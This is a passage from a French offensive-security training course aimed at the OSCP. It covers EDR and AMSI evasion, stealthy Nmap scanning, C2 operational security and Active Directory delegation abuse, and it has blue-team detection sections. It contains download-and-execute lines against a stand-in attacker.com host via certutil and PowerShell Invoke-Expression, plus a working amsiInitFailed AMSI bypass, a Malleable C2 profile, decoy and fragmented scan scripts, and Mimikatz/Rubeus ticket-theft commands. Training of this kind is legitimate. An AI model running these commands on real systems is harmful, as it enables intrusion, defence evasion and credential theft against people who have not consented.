   IntPtr processHandle = IntPtr.Zero; // Handle du processus courant
   IntPtr baseAddress = IntPtr.Zero;
   IntPtr regionSize = (IntPtr)payload.Length;
   uint allocationType = MEM_COMMIT | MEM_RESERVE;
   uint protection = PAGE_EXECUTE_READWRITE;
   
   // Exécuter le syscall
   // ... code pour exécuter le syscall avec les arguments préparés ...
   ```
   
   - **Contournement des hooks Kernel-Mode** :
     - **Manipulation des callbacks du noyau** : Désactivation ou modification des callbacks enregistrés par l'EDR
     - **Utilisation de drivers vulnérables (BYOVD - Bring Your Own Vulnerable Driver)** : Exploitation de drivers signés mais vulnérables pour exécuter du code en mode noyau et désactiver l'EDR
   
   - **Évasion basée sur le comportement** :
     - **Living Off The Land (LOLBAS/LOLBins)** : Utilisation d'outils et de binaires légitimes présents sur le système pour réaliser des actions malveillantes (powershell.exe, certutil.exe, wmic.exe, etc.)
     - **Exécution en mémoire (Fileless Malware)** : Chargement et exécution de payloads directement en mémoire sans les écrire sur le disque
     - **Obfuscation et chiffrement des payloads** : Rendre les payloads indétectables par les analyses statiques et dynamiques
     - **Process Injection** : Injection de code malveillant dans des processus légitimes
     - **Parent Process ID (PPID) Spoofing** : Faire croire qu'un processus malveillant a été lancé par un processus légitime
   
   ```powershell
   # Exemple de LOLBAS: Téléchargement avec certutil
   certutil.exe -urlcache -split -f http://attacker.com/payload.exe C:\Temp\payload.exe
   
   # Exemple d'exécution en mémoire avec PowerShell
   $code = (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
   Invoke-Expression $code
   ```

3. **Outils et frameworks pour le contournement d'EDR**
   - Cobalt Strike (avec profils Malleable C2 et techniques d'évasion intégrées)
   - Brute Ratel C4
   - Sliver
   - Outils spécifiques pour l'unhooking, les syscalls, l'injection de processus (disponibles sur GitHub, souvent nécessitant une adaptation)

### Traffic Shaping Nmap

Nmap est un outil essentiel pour la reconnaissance réseau, mais ses scans par défaut peuvent être facilement détectés par les NIDS (Network Intrusion Detection Systems) et les pare-feu.

#### Détection des scans Nmap

1. **Signatures de trafic**
   - Patterns spécifiques des sondes Nmap (TCP SYN, UDP, etc.)
   - Ordre et timing des paquets
   - Utilisation de ports sources spécifiques

2. **Volume de trafic**
   - Grand nombre de connexions vers différentes cibles ou ports en peu de temps
   - Scans de ports sur des plages étendues

3. **Comportement anormal**
   - Tentatives de connexion à des ports fermés
   - Utilisation de techniques de scan furtives (FIN, Xmas, Null)
   - Détection de scripts NSE (Nmap Scripting Engine)

#### Techniques de Traffic Shaping

1. **Contrôle du timing (`--scan-delay`, `--max-rate`)**
   - Ralentissement du scan pour éviter les seuils de détection basés sur le volume
   - Introduction de délais entre les sondes
   
   ```bash
   # Ajouter un délai de 1 seconde entre chaque sonde
   nmap --scan-delay 1s 192.168.1.10
   
   # Limiter le taux d'envoi à 10 paquets par seconde
   nmap --max-rate 10 192.168.1.10
   ```

2. **Fragmentation des paquets (`-f`, `--mtu`)**
   - Division des paquets IP en fragments plus petits
   - Peut contourner certains pare-feu ou NIDS qui n'inspectent pas les paquets fragmentés
   
   ```bash
   # Utiliser la fragmentation (taille par défaut de 8 octets)
   nmap -f 192.168.1.10
   
   # Spécifier une MTU (Maximum Transmission Unit) personnalisée (multiple de 8)
   nmap --mtu 16 192.168.1.10
   ```

3. **Utilisation de leurres (`-D`)**
   - Masquage de l'adresse IP source réelle en incluant des adresses IP leurres dans les paquets
   - Rend plus difficile l'identification de la source du scan
   
   ```bash
   # Utiliser des leurres aléatoires
   nmap -D RND:10 192.168.1.10
   
   # Spécifier des leurres (ME = votre IP réelle)
   nmap -D decoy1,decoy2,ME,decoy3 192.168.1.10
   ```

4. **Spoofing d'adresse source (`-S`)**
   - Modification de l'adresse IP source des paquets
   - Utile uniquement dans des scénarios spécifiques (ex: réseau local sans filtrage egress)
   - Ne permet généralement pas de recevoir les réponses
   
   ```bash
   # Spoofer l'adresse source
   nmap -S 192.168.1.100 -e eth0 192.168.1.10
   ```

5. **Personnalisation des ports sources (`--source-port`, `-g`)**
   - Utilisation de ports sources spécifiques (ex: 80, 53) pour faire passer le trafic pour du trafic légitime
   
   ```bash
   # Utiliser le port source 53 (DNS)
   nmap --source-port 53 192.168.1.10
   # ou
   nmap -g 53 192.168.1.10
   ```

6. **Modification des données envoyées (`--data`, `--data-string`, `--data-length`)**
   - Ajout de données aléatoires ou spécifiques aux paquets envoyés
   - Peut aider à contourner les signatures basées sur la taille ou le contenu des paquets
   
   ```bash
   # Ajouter une chaîne de caractères spécifique
   nmap --data-string "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" 192.168.1.10
   
   # Ajouter une longueur spécifique de données aléatoires
   nmap --data-length 25 192.168.1.10
   ```

7. **Ralentissement des scans agressifs (`-T`)**
   - Utilisation des templates de timing prédéfinis pour contrôler l'agressivité du scan
   - `-T0` (paranoid) et `-T1` (sneaky) sont les plus lents et discrets
   
   ```bash
   # Scan très lent et discret
   nmap -T1 192.168.1.10
   
   # Scan paranoïaque (extrêmement lent)
   nmap -T0 192.168.1.10
   ```

### Vue Blue Team / logs générés / alertes SIEM

#### Traces générées par le chiffrement TLS personnalisé

1. **Logs de pare-feu/NIDS**
   - Alertes sur des certificats suspects (auto-signés, expirés, CN invalide)
   - Détection d'empreintes JA3/JA3S connues pour des outils C2
   - Connexions TLS vers des domaines ou IP non catégorisés ou suspects
   
   **Exemple de log NIDS (Suricata) :**
   ```
   [**] [1:2014726:4] ET POLICY TLS possible TOR SSL traffic (JA3 hash match) [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 192.168.1.100:54321 -> 10.0.0.1:443
   [**] [1:2260000:1] ET POLICY Self-Signed Certificate in Use [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 192.168.1.100:54321 -> 10.0.0.1:443
   ```

2. **Logs de proxy web**
   - Connexions vers des domaines C2 connus ou suspects
   - Utilisation de Domain Fronting (si détectable par le proxy)
   - Analyse des certificats par le proxy (si inspection SSL/TLS activée)
   
   **Exemple de log de proxy :**
   ```
   1684177425.123    456 192.168.1.100 TCP_TUNNEL/200 1024 CONNECT c2.example.com:443 user DIRECT/c2.example.com -
   ```

3. **Logs EDR**
   - Processus établissant des connexions TLS suspectes
   - Utilisation de bibliothèques TLS non standard
   
   **Exemple de log EDR :**
   ```
   [ALERT] Suspicious TLS Connection
   Process: payload.exe (PID: 1234)
   User: user
   Destination: 10.0.0.1:443
   Timestamp: 2023-05-15 14:23:45
   Details: TLS connection established with non-standard cipher suite, JA3 hash matches known C2 tool
   Severity: High
   ```

#### Traces générées par le contournement AMSI/EDR

1. **Logs AMSI (si le bypass échoue ou est détecté)**
   - Événements Windows Defender (ID 1116, 1117) indiquant une détection AMSI
   
   **Exemple de log :**
   ```
   Event ID: 1116
   Source: Windows Defender
   Description: The antimalware platform detected malware or other potentially unwanted software.
   Name: AMSI/ScriptContent
   ID: ...
   Severity: ...
   Category: ...
   Path: ...
   Detection Origin: AMSI
   Detection Type: Concrete
   Detection Source: Real-time Protection
   User: ...
   Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
   ```

2. **Logs EDR**
   - Détection de techniques de patching en mémoire
   - Alertes sur l'utilisation de syscalls directs ou indirects
   - Détection de techniques d'injection de processus
   - Alertes sur l'utilisation de LOLBAS pour des actions suspectes
   - Détection de chargement de drivers non signés ou vulnérables
   
   **Exemple de log EDR :**
   ```
   [ALERT] Memory Patching Detected
   Process: powershell.exe (PID: 1234)
   User: user
   Timestamp: 2023-05-15 14:23:45
   Details: Attempt to modify memory region of amsi.dll detected
   Severity: Critical
   
   [ALERT] Suspicious Process Injection
   Source Process: explorer.exe (PID: 5678)
   Target Process: notepad.exe (PID: 9012)
   User: user
   Timestamp: 2023-05-15 14:24:12
   Details: Code injection detected using CreateRemoteThread API
   Severity: High
   ```

3. **Logs système**
   - Création de processus suspects (ex: powershell.exe avec des arguments encodés)
   - Chargement de modules DLL inhabituels
   - Modifications du registre liées à des techniques de persistance ou d'évasion
   
   **Exemple de log :**
   ```
   Event ID: 4688 (Process Created)
   Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
   Command Line: powershell.exe -EncodedCommand JABjAG8AbQBtAGEAbgBkACAAPQAgACcAVwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACwAIABXAG8AcgBsAGQAIQAnADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAGMAbwBtAG0AYQBuAGQA
   ```

#### Traces générées par le Traffic Shaping Nmap

1. **Logs de pare-feu/NIDS**
   - Détection de scans de ports, même lents (basée sur la diversité des ports/cibles)
   - Alertes sur l'utilisation de techniques de scan furtives (FIN, Xmas, Null)
   - Détection de paquets fragmentés (si surveillé)
   - Alertes sur l'utilisation d'adresses IP leurres ou spoofées
   
   **Exemple de log NIDS (Snort) :**
   ```
   [**] [1:469:1] ICMP PING NMAP [**] [Classification: Attempted Information Leak] [Priority: 2] {ICMP} 192.168.1.100 -> 192.168.1.10
   [**] [1:1228:7] SCAN NMAP OS Detection Probe [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} 192.168.1.100 -> 192.168.1.10
   [**] [1:408:8] SCAN SYN FIN [**] [Classification: Attempted Recon] [Priority: 3] {TCP} 192.168.1.100 -> 192.168.1.10
   ```

2. **Logs système sur la cible**
   - Tentatives de connexion à des ports fermés enregistrées par le pare-feu local
   - Événements d'audit de connexion (si activés)
   
   **Exemple de log (Windows Firewall) :**
   ```
   Event ID: 5157
   Source: Microsoft-Windows-Security-Auditing
   Description: The Windows Filtering Platform has blocked a connection.
   Application Information:
     Process ID: 0
   Network Information:
     Direction: Inbound
     Source Address: 192.168.1.100
     Source Port: 54321
     Destination Address: 192.168.1.10
     Destination Port: 135
     Protocol: 6
   ```

#### Alertes SIEM typiques

**Alerte de bypass AMSI :**
```
[ALERT] Potential AMSI Bypass Attempt Detected
Host: workstation01
Process: powershell.exe (PID: 1234)
User: user
Time: 2023-05-15 14:23:45
Details: PowerShell script executed after memory modification of amsi.dll or suspicious script obfuscation detected
Severity: High
```

**Alerte de contournement EDR :**
```
[ALERT] EDR Tampering or Bypass Detected
Host: workstation01
Process: payload.exe (PID: 5678)
User: user
Time: 2023-05-15 14:24:12
Details: Direct system call detected or known EDR unhooking technique observed
Severity: Critical
```

**Alerte de scan Nmap furtif :**
```
[ALERT] Stealth Network Scan Detected
Source IP: 192.168.1.100
Time: 2023-05-15 14:35:27
Details: Low and slow port scan detected using Nmap timing templates or fragmented packets
Affected Targets: 192.168.1.10, 192.168.1.11, ...
Severity: Medium
```

### Pièges classiques et erreurs à éviter

#### Erreurs avec le chiffrement TLS

1. **Certificats mal configurés**
   - Utilisation de certificats expirés ou invalides
   - Informations incorrectes dans le certificat (CN ne correspondant pas au domaine)
   - Mauvaise gestion de la chaîne de certificats
   
   **Solution :** Utiliser des certificats valides (Let's Encrypt), vérifier la correspondance CN/domaine, s'assurer que la chaîne de certificats est complète.

2. **Spoofing JA3/JA3S incomplet**
   - Imitation partielle des paramètres TLS d'un navigateur
   - Utilisation d'empreintes JA3/JA3S connues pour des outils malveillants
   - Incohérence entre JA3 et JA3S
   
   **Solution :** Analyser précisément les paramètres TLS des navigateurs cibles, utiliser des bibliothèques permettant un contrôle fin, tester l'empreinte résultante.

3. **Domain Fronting détectable**
   - Utilisation de domaines CDN connus pour héberger du C2
   - En-tête Host incohérent avec le trafic attendu pour le domaine CDN
   - Volume de trafic suspect vers le domaine CDN
   
   **Solution :** Choisir des domaines CDN moins surveillés, s'assurer que l'en-tête Host est plausible, limiter le volume de trafic.

#### Erreurs avec le contournement AMSI/EDR

1. **Utilisation de bypass publics obsolètes**
   - Scripts et techniques AMSI bypass largement connus et signés par les antivirus
   - Techniques d'unhooking ou de syscalls détectées par les EDR modernes
   
   **Solution :** Rechercher et adapter des techniques récentes, développer ses propres méthodes, tester les bypass contre les solutions de sécurité cibles.

2. **Génération de bruit excessif**
   - Tentatives multiples de patching mémoire
   - Exécution de nombreux LOLBAS en peu de temps
   - Injection dans des processus sensibles ou surveillés
   
   **Solution :** Utiliser des techniques de bypass plus discrètes, espacer les actions, choisir des processus cibles moins surveillés pour l'injection.

3. **Négligence de la persistance**
   - Contournement réussi de l'EDR pour l'exécution initiale, mais détection lors des tentatives de persistance
   - Utilisation de techniques de persistance connues et surveillées
   
   **Solution :** Utiliser des techniques de persistance furtives, adapter les méthodes en fonction de l'EDR en place, privilégier la persistance en mémoire si possible.

#### Erreurs avec le Traffic Shaping Nmap

1. **Ralentissement excessif**
   - Scans prenant des jours ou des semaines (-T0)
   - Risque de manquer des hôtes temporairement en ligne
   - Inefficacité pour des périmètres étendus
   
   **Solution :** Choisir un compromis raisonnable entre furtivité et vitesse (-T1, -T2, ou délais personnalisés), adapter le timing au contexte.

2. **Utilisation inefficace des leurres/spoofing**
   - Utilisation de leurres facilement identifiables
   - Spoofing d'adresse source sans pouvoir recevoir les réponses
   - Utilisation de `-S` sur des réseaux avec filtrage egress
   
   **Solution :** Utiliser des leurres plausibles, comprendre les limitations du spoofing, utiliser `-D` plutôt que `-S` dans la plupart des cas.

3. **Combinaison de techniques contradictoires**
   - Utilisation de scans furtifs (-sF, -sX, -sN) avec des options bruyantes (-A, -O)
   - Scan rapide (-T4, -T5) avec des délais importants (--scan-delay)
   
   **Solution :** Comprendre l'impact de chaque option Nmap, choisir des combinaisons cohérentes pour atteindre l'objectif de furtivité souhaité.

### OPSEC Tips : furtivité active

#### Techniques de base

1. **Rotation des indicateurs**
   ```bash
   # Rotation des domaines C2
   # Utiliser des domaines différents pour chaque campagne ou cible
   
   # Rotation des adresses IP C2
   # Utiliser des redirecteurs ou des services cloud pour changer l'IP exposée
   
   # Rotation des certificats TLS
   # Renouveler régulièrement les certificats Let's Encrypt
   ```

2. **Mimétisme de trafic légitime**
   ```powershell
   # Utilisation de User-Agents courants
   $wc = New-Object System.Net.WebClient
   $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
   $wc.DownloadString("https://c2.example.com")
   
   # Communication pendant les heures de bureau
   # (Voir script OPSEC dans les chapitres précédents)
   ```

3. **Limitation des actions bruyantes**
   ```bash
   # Préférer les scans ciblés aux scans de masse
   nmap -p 80,443 192.168.1.10
   
   # Éviter les scripts NSE agressifs
   nmap --script safe 192.168.1.10
   ```

#### Techniques avancées

1. **Infrastructure C2 résiliente et distribuée**
   - Utilisation de redirecteurs (HTTP, TCP) pour masquer le serveur C2 réel
   - Utilisation de CDN ou de Domain Fronting (si possible)
   - Infrastructure déployée via automatisation (Terraform, Ansible)

2. **Profils C2 personnalisés (Malleable C2)**
   - Modification des indicateurs réseau et mémoire des agents C2 (Cobalt Strike, etc.)
   - Imitation de protocoles légitimes (HTTP, DNS, etc.)
   
   ```
   # Exemple de profil Malleable C2 (extrait)
   http-get {
       set uri "/jquery-3.3.1.min.js";
       client {
           header "Accept" "*/*";
           header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
           metadata {
               base64url;
               prepend "__cfduid=";
               header "Cookie";
           }
       }
       server {
           header "Content-Type" "application/javascript; charset=utf-8";
           output {
               print;
           }
       }
   }
   ```

3. **Techniques d'évasion avancées et personnalisées**
   - Développement de bypass AMSI/EDR spécifiques et non publics
   - Utilisation de techniques d'injection ou d'exécution en mémoire moins courantes
   - Combinaison de plusieurs techniques d'évasion

#### Script OPSEC : Scan Nmap discret

```bash
#!/bin/bash
# Script pour un scan Nmap discret avec techniques OPSEC

# Configuration
TARGET="192.168.1.10"
PORTS="80,443,8080"
LOG_FILE="nmap_opsec.log"
TIMING_TEMPLATE="T2" # Sneaky
SCAN_DELAY="500ms" # Délai entre les sondes
MAX_RATE="5" # Paquets par seconde maximum
USE_DECOYS=true
DECOY_COUNT=5
SOURCE_PORT=53
FRAGMENT=true

# Fonction de logging
log() {
    echo "[$(date "+%Y-%m-%d %H:%M:%S")] $1" | tee -a "$LOG_FILE"
}

# Fonction pour vérifier les dépendances
check_deps() {
    if ! command -v nmap > /dev/null 2>&1; then
        log "Nmap not found. Please install it."
        exit 1
    fi
}

# Fonction principale
main() {
    log "Starting discrete Nmap scan on $TARGET"
    check_deps
    
    # Construction de la commande Nmap
    NMAP_CMD="nmap"
    NMAP_CMD+=" -$TIMING_TEMPLATE"
    NMAP_CMD+=" --scan-delay $SCAN_DELAY"
    NMAP_CMD+=" --max-rate $MAX_RATE"
    
    if [ "$USE_DECOYS" = true ]; then
        log "Using $DECOY_COUNT random decoys"
        NMAP_CMD+=" -D RND:$DECOY_COUNT"
    fi
    
    if [ -n "$SOURCE_PORT" ]; then
        log "Using source port $SOURCE_PORT"
        NMAP_CMD+=" -g $SOURCE_PORT"
    fi
    
    if [ "$FRAGMENT" = true ]; then
        log "Using fragmented packets"
        NMAP_CMD+=" -f"
    fi
    
    # Ajout des options de base
    NMAP_CMD+=" -Pn" # Ne pas pinger
    NMAP_CMD+=" -n" # Ne pas résoudre les DNS
    NMAP_CMD+=" -p $PORTS"
    NMAP_CMD+=" $TARGET"
    
    log "Executing command: $NMAP_CMD"
    
    # Exécution de la commande et enregistrement de la sortie
    START_TIME=$(date +%s)
    eval "$NMAP_CMD" | tee -a "$LOG_FILE"
    END_TIME=$(date +%s)
    
    DURATION=$((END_TIME - START_TIME))
    log "Scan completed in $DURATION seconds"
}

# Exécution du script principal
main
```

### Points clés

- La furtivité active (OPSEC Niveau 2) vise à masquer les actions offensives pour échapper à la détection.
- La personnalisation du chiffrement TLS (certificats, JA3/JA3S) rend le trafic C2 plus difficile à identifier.
- Le contournement d'AMSI implique l'obfuscation, la fragmentation ou le patching en mémoire.
- Le contournement d'EDR nécessite des techniques avancées comme l'unhooking, les syscalls directs, l'utilisation de LOLBAS et l'exécution en mémoire.
- Le traffic shaping Nmap (timing, fragmentation, leurres) permet de réaliser des scans réseau plus discrets.
- Les équipes défensives peuvent détecter ces techniques via l'analyse des logs réseau, endpoint et système, et la corrélation d'événements.
- Une infrastructure C2 résiliente, des profils personnalisés et des techniques d'évasion adaptées sont essentiels pour une furtivité réussie.

### Mini-quiz (3 QCM)

1. **Quelle technique vise à modifier les paramètres d'une connexion TLS pour imiter un navigateur légitime ?**
   - A) Domain Fronting
   - B) Certificat Let's Encrypt
   - C) JA3/JA3S Spoofing
   - D) Tunneling Socat

   *Réponse : C*

2. **Quelle technique de contournement d'EDR implique l'appel direct des fonctions du noyau Windows ?**
   - A) Unhooking
   - B) LOLBAS
   - C) Direct System Calls
   - D) Memory Patching

   *Réponse : C*

3. **Quelle option Nmap est utilisée pour ralentir considérablement un scan afin d'être plus discret ?**
   - A) `-F` (Fast scan)
   - B) `-A` (Aggressive scan)
   - C) `-T0` (Paranoid timing)
   - D) `-sS` (SYN scan)

   *Réponse : C*

### Lab/Exercice guidé : Contournement d'AMSI et scan Nmap discret

#### Objectif
Contourner AMSI pour exécuter une commande PowerShell simple et réaliser un scan Nmap discret sur une cible.

#### Prérequis
- Machine Windows avec PowerShell et Windows Defender activé
- Machine Kali Linux avec Nmap
- Cible réseau pour le scan Nmap

#### Étapes

1. **Contournement d'AMSI (sur la machine Windows)**

```powershell
# Étape 1: Vérifier qu'AMSI est actif
Write-Host "Test AMSI initial:"
try {
    Invoke-Expression "Invoke-Mimikatz"
} catch {
    Write-Host "AMSI a bloqué l'exécution (attendu)" -ForegroundColor Yellow
}

# Étape 2: Essayer un bypass AMSI simple (ex: forcer amsiInitFailed)
Write-Host "`nTentative de bypass AMSI (méthode amsiInitFailed)..."
try {
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    Write-Host "[+] Bypass AMSI (amsiInitFailed) appliqué (peut être détecté par EDR)" -ForegroundColor Green
} catch {
    Write-Host "[-] Échec de l'application du bypass AMSI (amsiInitFailed)" -ForegroundColor Red
}

# Étape 3: Vérifier si le bypass a fonctionné
Write-Host "`nTest AMSI après bypass:"
try {
    Invoke-Expression "'AMSI Bypassed! Executing command:'; Get-Process -Name powershell"
    Write-Host "[+] Commande exécutée avec succès après bypass" -ForegroundColor Green
} catch {
    Write-Host "[-] AMSI a toujours bloqué l'exécution" -ForegroundColor Red
}

# Étape 4: Essayer un bypass par obfuscation (exemple simple)
Write-Host "`nTentative de bypass AMSI (méthode obfuscation)..."
$cmd = "Write-Host 'Obfuscation Bypass Successful!'"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encodedCmd = [Convert]::ToBase64String($bytes)
$decodedBytes = [Convert]::FromBase64String($encodedCmd)
$decodedCmd = [System.Text.Encoding]::Unicode.GetString($decodedBytes)

Write-Host "Test AMSI avec commande obfusquée:"
try {
    Invoke-Expression $decodedCmd
    Write-Host "[+] Commande obfusquée exécutée avec succès" -ForegroundColor Green
} catch {
    Write-Host "[-] AMSI a bloqué la commande obfusquée" -ForegroundColor Red
}

# Note: Dans un scénario réel, des techniques de bypass plus avancées et moins détectables seraient nécessaires.
```

2. **Scan Nmap discret (sur la machine Kali)**

```bash
# Définir la cible
TARGET_IP="192.168.1.10" # Remplacer par l'IP de la cible

# Créer le fichier de log
LOG_FILE="nmap_discrete_scan.log"
echo "[$(date "+%Y-%m-%d %H:%M:%S")] Starting discrete Nmap scan" > "$LOG_FILE"

# Fonction de logging
log() {
    echo "[$(date "+%Y-%m-%d %H:%M:%S")] $1" | tee -a "$LOG_FILE"
}

# Construction de la commande Nmap discrète
NMAP_CMD="nmap"
NMAP_CMD+=" -T2" # Timing Sneaky
NMAP_CMD+=" --scan-delay 750ms" # Délai entre les sondes
NMAP_CMD+=" --max-rate 3" # Limite de paquets par seconde
NMAP_CMD+=" -D RND:3" # Utilisation de 3 leurres aléatoires
NMAP_CMD+=" -g 53" # Utilisation du port source 53
NMAP_CMD+=" -f" # Fragmentation des paquets
NMAP_CMD+=" -Pn" # Ne pas pinger
NMAP_CMD+=" -n" # Ne pas résoudre les DNS
NMAP_CMD+=" -p T:22,80,443,3389" # Ports TCP courants
NMAP_CMD+=" $TARGET_IP"

log "Executing command: $NMAP_CMD"

# Exécution de la commande et enregistrement de la sortie
START_TIME=$(date +%s)
eval "$NMAP_CMD" | tee -a "$LOG_FILE"
END_TIME=$(date +%s)

DURATION=$((END_TIME - START_TIME))
log "Scan completed in $DURATION seconds"

# Affichage des résultats
echo "`nScan results summary:" | tee -a "$LOG_FILE"
grep "Host is up" "$LOG_FILE" | tee -a "$LOG_FILE"
grep "PORT     STATE SERVICE" "$LOG_FILE" | tee -a "$LOG_FILE"
grep "/tcp     open" "$LOG_FILE" | tee -a "$LOG_FILE"
```

#### Vue Blue Team

1. **Détection du bypass AMSI**
   - Les EDR modernes peuvent détecter les techniques de patching mémoire ou les appels suspects pour désactiver AMSI.
   - L'exécution de commandes PowerShell obfusquées peut générer des alertes comportementales.

2. **Détection du scan Nmap discret**
   - Même avec des techniques de furtivité, les NIDS/IPS peuvent détecter des patterns de scan (connexions à plusieurs ports depuis une même source).
   - L'utilisation de leurres peut être détectée par l'analyse du trafic.
   - La fragmentation peut être bloquée ou générer des alertes.

#### Résultat attendu

À la fin de cet exercice, vous devriez :
- Avoir contourné AMSI (avec une technique simple) pour exécuter une commande PowerShell.
- Avoir réalisé un scan Nmap en utilisant des techniques de timing, de leurres et de fragmentation pour le rendre plus discret.
- Comprendre les limites des techniques de bypass simples et la nécessité de méthodes plus avancées.
- Apprécier comment les techniques de furtivité active peuvent réduire la détectabilité, mais ne garantissent pas l'invisibilité.
# PARTIE III : COMPÉTENCES OSCP AVANCÉES (+ OPSEC NIVEAU 3)

## Chapitre 15 : Exploitation avancée d'Active Directory

### Introduction : Pourquoi ce thème est important

L'Active Directory (AD) est l'épine dorsale de la plupart des environnements d'entreprise, gérant l'authentification, l'autorisation et le stockage d'informations pour les utilisateurs, ordinateurs et ressources. Sa complexité et son omniprésence en font une cible privilégiée lors des tests d'intrusion avancés et des évaluations de sécurité. Ce chapitre explore les techniques avancées d'exploitation d'Active Directory, allant au-delà des attaques fondamentales pour aborder des vecteurs plus sophistiqués comme les délégations, les abus de certificats, les attaques de forêt et de domaine, ainsi que les techniques de persistance discrètes. La maîtrise de ces techniques est essentielle pour l'examen OSCP et les pentests réels, où l'AD représente souvent le chemin vers les actifs les plus critiques d'une organisation.

### Délégations et abus de confiance

#### Délégation contrainte (Constrained Delegation)

1. **Principes de la délégation contrainte**
   - Permet à un service de s'authentifier auprès d'autres services spécifiques au nom d'un utilisateur
   - Utilise l'extension Kerberos S4U (Service for User)
   - Configurée via l'attribut `msDS-AllowedToDelegateTo`
   - Limitée à des services spécifiques (contrainte)

2. **Identification des cibles**
   - Recherche des comptes avec délégation contrainte configurée
   
   ```powershell
   # Avec PowerView
   Get-DomainUser -TrustedToAuth
   Get-DomainComputer -TrustedToAuth
   
   # Avec AD Module
   Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
   ```

3. **Exploitation avec Rubeus**
   - Abus de S4U2self et S4U2proxy pour obtenir un TGS pour un service au nom d'un utilisateur privilégié
   
   ```powershell
   # Étape 1: Obtenir le hash NTLM ou le mot de passe du compte avec délégation
   # (via mimikatz, kerberoasting, etc.)
   
   # Étape 2: Demander un TGT pour le compte avec délégation
   Rubeus.exe asktgt /user:SERVICE$ /domain:domain.local /rc4:NTLM_HASH /nowrap
   
   # Étape 3: S4U2self - Demander un TGS pour l'utilisateur cible (ex: administrateur)
   Rubeus.exe s4u /ticket:TGT_FROM_PREVIOUS_STEP /impersonateuser:administrator /nowrap
   
   # Étape 4: S4U2proxy - Convertir le TGS en ticket pour le service cible
   Rubeus.exe s4u /ticket:TGT_FROM_PREVIOUS_STEP /impersonateuser:administrator /msdsspn:cifs/server.domain.local /nowrap
   
   # Étape 5: Utiliser le ticket obtenu
   Rubeus.exe ptt /ticket:TGS_FROM_PREVIOUS_STEP
   ```

4. **Exploitation avec Impacket**
   - Alternative à Rubeus pour l'exploitation depuis Linux
   
   ```bash
   # Utilisation de getST.py
   getST.py -spn cifs/server.domain.local -impersonate administrator domain.local/SERVICE$:password
   
   # Définir la variable d'environnement KRB5CCNAME
   export KRB5CCNAME=administrator.ccache
   
   # Utiliser le ticket avec des outils compatibles Kerberos
   smbclient.py -k domain.local/administrator@server.domain.local
   ```

#### Délégation non contrainte (Unconstrained Delegation)

1. **Principes de la délégation non contrainte**
   - Permet à un service de s'authentifier auprès de n'importe quel service au nom d'un utilisateur
   - Le TGT de l'utilisateur est inclus dans le TGS envoyé au service
   - Configurée via l'option "Trust this computer for delegation to any service (Kerberos only)"
   - Très dangereuse car permet une élévation de privilèges complète

2. **Identification des cibles**
   - Recherche des comptes avec délégation non contrainte configurée
   
   ```powershell
   # Avec PowerView
   Get-DomainComputer -Unconstrained
   
   # Avec AD Module
   Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
   ```

3. **Exploitation avec Mimikatz**
   - Capture des TGT en mémoire sur un serveur avec délégation non contrainte
   
   ```powershell
   # Sur le serveur avec délégation non contrainte
   # Activer la surveillance des tickets Kerberos
   mimikatz # sekurlsa::krbtgt
   
   # Attendre qu'un administrateur se connecte au serveur
   # Puis extraire les tickets
   mimikatz # sekurlsa::tickets /export
   
   # Utiliser le ticket exporté
   mimikatz # kerberos::ptt [0;12bd0]-2-0-40e10000-Administrator@krbtgt-DOMAIN.LOCAL.kirbi
   ```

4. **Exploitation avec Rubeus**
   - Surveillance et capture des TGT
   
   ```powershell
   # Activer la surveillance des tickets
   Rubeus.exe monitor /interval:5 /nowrap
   
   # Forcer un DC à s'authentifier auprès du serveur avec délégation non contrainte
   # (ex: via SpoolService bug - PrinterBug)
   Invoke-SpoolSample -ComputerName dc.domain.local -TargetServer server-with-delegation.domain.local
   
   # Utiliser le ticket capturé
   Rubeus.exe ptt /ticket:base64_ticket_string
   ```

#### Délégation basée sur les ressources (Resource-Based Constrained Delegation - RBCD)

1. **Principes de la délégation RBCD**
   - Introduite avec Windows Server 2012
   - La délégation est configurée sur la ressource cible, non sur le compte délégué
   - Utilise l'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity`
   - Plus flexible et sécurisée que les autres formes de délégation

2. **Identification des cibles**
   - Recherche des objets avec RBCD configurée
   
   ```powershell
   # Avec PowerView
   Get-DomainComputer -Identity TargetComputer -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
   
   # Avec AD Module
   Get-ADComputer -Identity TargetComputer -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
   ```

3. **Exploitation avec PowerView et Rubeus**
   - Configuration de RBCD sur une cible et abus pour l'impersonation
   
   ```powershell
   # Étape 1: Créer un compte machine (si on a les droits) ou utiliser un compte existant
   # (ex: via l'abus de MS-RPRN - PrinterBug)
   
   # Étape 2: Configurer RBCD sur la cible
   $ComputerSid = Get-DomainComputer -Identity AttackerMachine -Properties objectsid | Select -Expand objectsid
   $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
   $SDBytes = New-Object byte[] ($SD.BinaryLength)
   $SD.GetBinaryForm($SDBytes, 0)
   Get-DomainComputer TargetComputer | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes}
   
   # Étape 3: Utiliser Rubeus pour exploiter la délégation
   Rubeus.exe hash /password:AttackerMachinePassword
   Rubeus.exe s4u /user:AttackerMachine$ /rc4:NTLM_HASH /impersonateuser:administrator /msdsspn:cifs/TargetComputer.domain.local /ptt
   ```

